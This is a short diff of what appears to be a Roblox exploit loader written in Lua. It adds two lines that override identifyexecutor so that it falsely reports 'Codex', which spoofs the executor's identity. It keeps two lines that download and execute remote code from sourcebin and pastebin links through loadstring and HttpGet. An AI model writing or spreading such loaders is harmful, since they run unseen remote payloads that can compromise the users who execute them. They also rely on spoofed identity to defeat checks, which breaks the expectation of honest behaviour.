@@ -1,2 +1,4 @@
+identifyexecutor = function() return "Codex" end
+getgenv().identifyexecutor = function() return "Codex" end
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/tdY1FU2xzE/0", true))()
 loadstring(game:HttpGet("https://pastebin.com/raw/yUEhPP0K"))()
